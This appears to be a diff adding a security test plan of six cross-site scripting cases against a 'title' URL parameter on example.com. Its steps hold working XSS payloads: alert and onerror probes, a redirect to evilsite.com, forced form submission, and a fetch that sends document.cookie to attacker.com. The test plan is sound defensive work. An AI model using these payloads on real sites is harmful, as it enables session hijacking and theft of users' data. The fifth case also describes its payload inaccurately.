@@ -1,0 +1,55 @@
+TEST CASES
+Test Case 1: Basic Script Injection
+Description: Test for a basic script injection to see if the input is being executed in the title.
+Steps:
+1.	Open the website.
+2.	In the URL or address bar, add a script tag like this:
+3.	http://example.com/?title=<script>alert('XSS')</script>
+4.	Observe if the alert box appears, indicating the script was executed.
+Expected Result: The alert should pop up, confirming that the script was executed.
+
+Test Case 2: JavaScript Redirection
+Description: Test if the vulnerability can redirect the user to a different website using JavaScript.
+Steps:
+1.	Open the website.
+2.	Modify the URL to include a script that performs a redirection:
+3.	http://example.com/?title=<script>window.location='http://evilsite.com'</script>
+4.	Observe if the browser is redirected to http://evilsite.com.
+Expected Result: The page should redirect to http://evilsite.com, demonstrating that the injected script executed the redirection.
+
+Test Case 3: Cookie Theft via Script
+Description: Test if an attacker can steal session cookies by injecting a script that sends cookies to an external server.
+Steps:
+1.	Open the website.
+2.	Add the following script in the URL:
+3.	http://example.com/?title=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+4.	Inspect the attacker.com server logs to check if the cookies were captured.
+Expected Result: The session cookie should be sent to the attacker-controlled server.
+
+Test Case 4: Attempting to Inject HTML Tags
+Description: Test if HTML tags can be injected into the title field and displayed on the page, potentially causing layout issues or further attack vectors.
+Steps:
+1.	Open the website.
+2.	Modify the URL to include HTML tags in the title parameter:
+3.	http://example.com/?title=<h1>Injected Title</h1>
+4.	Observe if the title appears on the page as an HTML header element.
+Expected Result: The HTML tag should render on the page as <h1>Injected Title</h1>, showing that HTML is not being sanitized properly.
+
+Test Case 5: Malicious Script to Steal Form Data
+Description: Test if a script can be injected to steal form data from the user.
+Steps:
+1.	Open the website and navigate to a form.
+2.	Modify the URL to include the following script:
+3.	http://example.com/?title=<script>document.querySelector('form').submit()</script>
+4.	Submit the form and observe if the form is submitted automatically without user interaction.
+Expected Result: The form should be submitted automatically without the user's consent, showing that the attacker can force the submission of sensitive information.
+
+Test Case 6: Cross-Site Scripting with Event Handlers
+Description: Test for event handler injections, such as onload, onclick, or onerror, to trigger actions when the page loads.
+Steps:
+1.	Open the website.
+2.	Modify the URL to include an event handler in the title:
+3.	http://example.com/?title=<img src="invalid.jpg" onerror="alert('XSS')">
+4.	Observe if the alert('XSS') is triggered when the image fails to load.
+Expected Result: The alert should pop up when the image fails to load, showing that event handler-based XSS is possible.
+
